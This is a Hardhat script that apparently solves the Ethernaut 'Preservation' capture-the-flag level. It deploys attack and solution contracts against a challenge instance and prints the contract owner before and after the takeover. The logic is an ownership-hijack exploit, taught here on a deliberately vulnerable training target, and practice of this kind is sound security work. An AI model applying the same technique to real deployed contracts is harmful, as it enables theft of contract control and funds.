import { ethers } from "hardhat";
import { ETHERNAUT_ABI, ETHERNAUT_ADDRESS } from "./constants";

const INSTANCE_ADDRESS = "0x57998dA5721520f73905e1e01b58E0473a901846";

async function main() {
  const [me] = await ethers.getSigners();
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  const ethernaut = await ethers.getContractAt(
    ETHERNAUT_ABI,
    ETHERNAUT_ADDRESS
  );

  const Contract = await ethers.getContractFactory("Preservation");
  const contract = await Contract.attach(INSTANCE_ADDRESS);

  await contract.deployed();

  const AttackLibrary = await ethers.getContractFactory(
    "AttackLibraryContract"
  );
  const attackLibrary = await AttackLibrary.deploy();
  await attackLibrary.deployed();

  // with contract - does not pass level though as the new owner address is different
  const Solution = await ethers.getContractFactory("Level16Solution");
  const solution = await Solution.deploy(
    contract.address,
    attackLibrary.address
  );
  await solution.deployed();

  console.log("Owner before: ", await contract.owner());

  await solution.connect(me).attack();

  console.log("Owner after: ", await contract.owner());

  /**
   * Uncomment the below to automatically submit the level instance, you will have to refresh the ethernaut page and will not see the pretty level completed message.
   * I suggest submittin the instance on the ethernaut website.
   * I only did this for my own personal satisfaction
   */
  // submit level instance
  // const tx = await ethernaut.submitLevelInstance(INSTANCE_ADDRESS);
  // const rc = await tx.wait();
  // console.log(rc);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
